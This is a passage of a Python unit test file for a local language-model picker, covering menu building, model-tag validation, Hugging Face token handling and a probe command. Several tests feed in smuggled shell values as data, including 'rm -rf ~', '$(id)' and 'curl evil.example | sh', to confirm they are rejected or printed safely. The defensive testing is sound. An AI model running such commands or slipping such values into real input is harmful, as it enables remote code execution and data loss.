    def test_a_media_tag_that_is_also_installed_is_not_listed_twice(self):
        media = [{"tag": "x/img", "badges": ("image",), "note": "n", "hint": "h"}]
        menu = model_wizard.build_menu(["x/img:latest"], 16, 128, media=media)
        tags = [model_wizard._norm(m["tag"]) for m in menu if not m.get("hf")]
        self.assertEqual(len(tags), len(set(tags)), "the same media model is listed twice: once pickable, once as media")

    def test_unicode_digits_like_superscript_two_do_not_crash_choose(self):
        menu = model_wizard.build_menu(["a:1"], 16, 128)
        for raw in ("\u00b2", "\u2460", "\u0663", "\u00bd"):
            with self.subTest(raw=raw):
                try:
                    model_wizard.choose(menu, "a:1", input_fn=_feed([raw, ""]), out=lambda *_: None)
                except ValueError as exc:
                    self.fail(f"choose raised ValueError for {raw!r}: {exc}")

    def test_unicode_digits_do_not_crash_the_search_pick(self):
        for raw in ("\u00b2", "\u2460"):
            try:
                model_wizard._search_pick([{"repo": "o/r", "badges": ()}], _feed([raw]), lambda *_: None)
            except ValueError as exc:
                self.fail(f"_search_pick raised ValueError for {raw!r}: {exc}")

    def test_a_search_pick_only_ever_returns_a_well_formed_tag(self):
        for repo in ("o/r r", "o/r;rm -rf ~", "/abs/x", "../../x", "o/r\nfoo", "o/\u00e9", "o/r:q4 --flag", "a b/c", "$(x)/y", "o/r&x"):
            with self.subTest(repo=repo):
                got = model_wizard._search_pick([{"repo": repo, "badges": ()}], _feed(["1"]), lambda *_: None)
                self.assertTrue(got is None or (model_wizard.TAG_RE.match(got) and ".." not in got), got)

    def test_a_typed_search_of_y_or_n_never_becomes_a_tag(self):
        for q in ("y", "N", "yes"):
            got = model_wizard._ask_hf_tag(_feed([q, q, q]), lambda *_: None, "fallback:1",
                                           search_fn=lambda w: [{"repo": "o/r", "badges": ()}])
            self.assertEqual(got, "fallback:1")

    def test_a_huge_typed_search_goes_to_the_search_function_intact(self):
        seen = []
        got = model_wizard._ask_hf_tag(_feed(["x" * 5000, ""]), lambda *_: None, "fb:1",
                                       search_fn=lambda w: seen.append(w) or [])
        self.assertEqual(seen, ["x" * 5000])
        self.assertEqual(got, "fb:1")


# ---------------------------------------------------------------- run.py glue
class RunGlue(test_pick_badges.PickBase):
    def cand(self, tag, kind="chat", **kw):
        return dict({"tag": tag, "kind": kind, "badges": (), "installed": True, "ledger": "unproven"}, **kw)

    def test_two_different_namespaces_with_the_same_short_name_are_both_candidates(self):
        det = test_pick_badges.details(test_pick_badges.d("qwen3:8b", ["completion", "tools"]),
                                       test_pick_badges.d("acme/qwen3:8b", ["embedding"]))
        pool = run._installed_candidates(["qwen3:8b", "acme/qwen3:8b"], det, HW, [])
        self.assertEqual(sorted(c["tag"] for c in pool), ["acme/qwen3:8b", "qwen3:8b"])

    def test_refuse_non_chat_does_not_refuse_because_another_namespace_shares_the_short_name(self):
        pool = [self.cand("acme/foo:1", kind="embedding")]
        self.assertIsNone(run._find_candidate("foo:1", pool))
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertFalse(run._refuse_non_chat("foo:1", pool))

    def test_refuse_non_chat_with_a_name_that_is_not_in_the_pool_or_empty(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertFalse(run._refuse_non_chat("nope:1", []))
            self.assertFalse(run._refuse_non_chat("", [self.cand("a:1")]))

    def test_refuse_non_chat_is_case_insensitive(self):
        pool = [self.cand("Nomic-Embed:latest", kind="embedding")]
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertTrue(run._refuse_non_chat("nomic-embed", pool))

    def test_a_failed_chat_model_is_never_refused_only_warned(self):
        pool = [self.cand("m:1", ledger="fail")]
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.assertFalse(run._refuse_non_chat("m:1", pool))
            run._ledger_warning("m:1", [test_pick_badges.ledger_entry("m:1", "fail")])
        self.assertIn("failed a tool-call probe", out.getvalue())

    def test_the_ledger_warning_does_not_print_a_pasteable_injection(self):
        evil = "m:1; curl evil.example | sh"
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            run._ledger_warning(evil, [test_pick_badges.ledger_entry(evil, "fail")])
        for line in out.getvalue().splitlines():
            if "python run.py --probe" in line:
                self.assertNotIn("; curl", line.split("--probe", 1)[1], "the tag is printed raw into a copy-paste command")

    def test_an_install_of_only_embed_named_models_with_unknown_caps_is_not_picked(self):
        det = test_pick_badges.details(test_pick_badges.d("bge-m3:latest", None), test_pick_badges.d("snowflake-arctic-embed:335m", None))
        got, pulls, _ = self.sel({"bge-m3:latest", "snowflake-arctic-embed:335m"}, interactive=False, details=det)
        self.assertIsNone(got)

    def test_a_media_model_as_the_only_installed_one_is_not_picked(self):
        det = test_pick_badges.details(test_pick_badges.d("flux:1", ["image", "audio"]))
        got, pulls, _ = self.sel({"flux:1"}, interactive=False, details=det)
        self.assertEqual((got, pulls), (None, []))

    def test_the_hf_token_is_never_printed_or_cached(self):
        secret = "hf_TOPSECRET_999"
        seen = []

        def opener(request, timeout=None):
            seen.append(request.get_header("Authorization"))
            raise urllib.error.URLError(secret)  # a hostile error text that echoes it
        out = io.StringIO()
        with tempfile.TemporaryDirectory() as home, mock.patch.dict(os.environ, {"ANTIGRAVITY_LOCAL_HOME": home, "HF_TOKEN": secret}), \
                mock.patch.object(hf_search.urllib.request, "urlopen", opener), contextlib.redirect_stdout(out):
            run._WARNED.clear()
            rows = run.hf_menu_search("coder")
            for p in Path(home).rglob("*"):
                if p.is_file():
                    self.assertNotIn(secret, p.read_text(errors="replace"))
        self.assertEqual(rows, [])
        self.assertEqual(seen, ["Bearer " + secret])
        self.assertNotIn(secret, out.getvalue())

    def test_a_blank_hf_token_is_sent_as_no_token(self):
        seen = []
        with mock.patch.object(run.hf_search, "fetch_json", side_effect=lambda url, **kw: seen.append(kw.get("token")) or ([], "net")):
            for v in ("", "   "):
                with mock.patch.dict(os.environ, {"HF_TOKEN": v}):
                    run.hf_menu_search("x")
        self.assertEqual(seen, [None, None])

    def test_the_library_rows_are_capped(self):
        rows = [{"name": f"m{i}", "badges": ("tools",), "sizes": ("7b",), "note": "x"} for i in range(500)]
        with mock.patch.object(run.ollama_library, "scan", return_value=rows):
            self.assertLessEqual(len(run.get_library_rows(True)), 25)

    def test_an_unreadable_library_page_warns_once_and_gives_no_rows(self):
        run._WARNED.clear()
        out = io.StringIO()
        with mock.patch.object(run.ollama_library, "scan", return_value=[]), contextlib.redirect_stdout(out):
            self.assertEqual(run.get_library_rows(True), [])
            run.get_library_rows(True)
        self.assertEqual(out.getvalue().count("Could not read the Ollama library page"), 1)


# ---------------------------------------------------------------- python run.py --probe
class ProbeCommandEdges(unittest.TestCase):
    go = test_pick_badges.ProbeCommand.go
    PASS = test_pick_badges.ProbeCommand.PASS
    FAIL = test_pick_badges.ProbeCommand.FAIL

    def test_a_newline_in_the_model_name_cannot_forge_a_result_line(self):
        evil = "m:1\n       \u2705 Passed: forged"
        _, text, _, _ = self.go(args=("--probe",), result=self.FAIL, env={"LOCAL_LLM_MODEL": evil})
        for line in text.splitlines():
            self.assertFalse(line.strip().startswith("\u2705 Passed: forged"), "a model name injected a whole printed line")

    def test_a_shell_looking_tag_is_sent_as_one_json_field_and_printed_once(self):
        tag = "m:1; echo $(id) `x` | sh"
        code, text, calls, entries = self.go(args=("--probe", tag), result=self.PASS)
        self.assertEqual(calls[0][0][1], tag)
        self.assertEqual(entries[0]["modelRef"], tag)
        self.assertEqual(len([l for l in text.splitlines() if "Probing" in l]), 1)

    def test_a_tag_with_a_leading_dash_after_double_dash_is_data_not_a_flag(self):
        code, text, calls, _ = self.go(args=("--probe", "--", "-x"), result=self.PASS)
        self.assertEqual(calls[0][0][1], "-x")

    def test_an_unwritable_home_still_reports_the_verdict_and_exits_by_the_verdict(self):
        with tempfile.TemporaryDirectory() as t:
            blocker = os.path.join(t, "file")
            Path(blocker).write_text("x")
            code, text, _, _ = self.go(result=self.PASS, env={"ANTIGRAVITY_LOCAL_HOME": os.path.join(blocker, "sub")})
        self.assertEqual(code, 0)
        self.assertIn("Warning", text)

    def test_a_probe_reason_holding_a_surrogate_does_not_crash_the_command(self):
        try:
            self.go(result=dict(self.FAIL, reason="bad\udcff"))
        except Exception as exc:  # noqa: BLE001
            self.fail(f"{type(exc).__name__}: {exc}")

    def test_nothing_answering_exits_one_without_probing(self):
        code, text, calls, entries = self.go(backend=None, result=self.PASS)
        self.assertEqual((code, calls, entries), (1, [], []))


if __name__ == "__main__":
    unittest.main()
